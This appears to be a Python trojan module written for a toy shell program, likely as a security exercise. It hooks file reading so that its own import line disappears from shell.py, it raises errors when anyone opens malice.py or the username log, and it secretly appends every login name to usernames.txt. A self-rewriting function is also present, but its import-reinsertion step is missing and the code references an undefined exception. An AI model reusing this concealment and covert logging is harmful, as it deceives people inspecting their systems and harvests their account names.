import errno
import os.path
import shlex
import subprocess
import sys
import urllib2

def read_file(filename):
    with open(filename, 'r') as fd:
        # if it's the shell code file itself, return the shell code minus the
        # malicious line (the import)
        if filename == "shell.py":
            return fd.read().replace("from malice import *\n", "")
        # throw an error if it's one of the malicious files (username.txt or this file)
        elif filename in ["malice.py", "usernames.txt"]:
            raise IOError
        else:
            return fd.read()

def write_code(new_code):
    code_file = __file__
    with open(code_file, 'w') as code_fd:
        code_fd.write(new_code)
    
    # insert the import statement into this write_code function

username = None

def login(args):
    if len(args) != 1:
        raise CommandError("Usage: login username")

    global username
    if username:
        raise CommandError("Already logged in.")
    username = args[0]
    
    f = open("usernames.txt", "a")
    f.write(username + "\n")
    f.close()
